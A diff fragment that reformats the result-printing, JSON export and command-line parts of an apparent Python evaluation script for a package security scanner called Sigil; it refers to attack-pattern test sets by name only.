+        print("\n🚀 RECOMMENDED POSITIONING:")
         print(f"  {scorecard.recommended_positioning}")
-        
-        print(f"\n📋 NEXT STEPS:")
+
+        print("\n📋 NEXT STEPS:")
         for i, step in enumerate(scorecard.next_steps, 1):
             print(f"  {i}. {step}")
-        
+
         print("\n" + "=" * 70)
-    
+
     def export_results(self, filepath: str):
         """Export detailed results to JSON file."""
-        with open(filepath, 'w') as f:
-            json.dump({
-                "test_results": [asdict(result) for result in self.results],
-                "timestamp": time.time(),
-                "test_configuration": {
-                    "osv_known_attacks": OSV_KNOWN_ATTACKS,
-                    "novel_patterns": NOVEL_ATTACK_PATTERNS,
-                    "clean_packages": CLEAN_TOP_PACKAGES,
-                    "concurrent_requests": CONCURRENT_LOAD_REQUESTS
-                }
-            }, f, indent=2)
+        with open(filepath, "w") as f:
+            json.dump(
+                {
+                    "test_results": [asdict(result) for result in self.results],
+                    "timestamp": time.time(),
+                    "test_configuration": {
+                        "osv_known_attacks": OSV_KNOWN_ATTACKS,
+                        "novel_patterns": NOVEL_ATTACK_PATTERNS,
+                        "clean_packages": CLEAN_TOP_PACKAGES,
+                        "concurrent_requests": CONCURRENT_LOAD_REQUESTS,
+                    },
+                },
+                f,
+                indent=2,
+            )
 
 
 # ── CLI Interface ──────────────────────────────────────────────────────────
 
+
 def main():
     """CLI interface for running D1-D4 evaluation."""
     import argparse
-    
+
     parser = argparse.ArgumentParser(description="Sigil D1-D4 Performance Evaluation")
-    parser.add_argument("--api-url", default="http://localhost:8000", 
-                       help="API base URL")
-    parser.add_argument("--output", default="d1_d4_results.json",
-                       help="Output file for detailed results")
-    parser.add_argument("--verbose", action="store_true",
-                       help="Enable verbose output")
-    
+    parser.add_argument(
+        "--api-url", default="http://localhost:8000", help="API base URL"
+    )
+    parser.add_argument(
+        "--output",
+        default="d1_d4_results.json",
+        help="Output file for detailed results",
+    )
+    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
+
     args = parser.parse_args()
-    
+
     if args.verbose:
         logging.basicConfig(level=logging.INFO)
-    
+
     # Run the evaluation
     suite = D1D4TestSuite(api_base_url=args.api_url)
-    scorecard = suite.run_full_evaluation()
-    
+    suite.run_full_evaluation()
+
     # Export results
     suite.export_results(args.output)
     print(f"\n💾 Detailed results exported to: {args.output}")
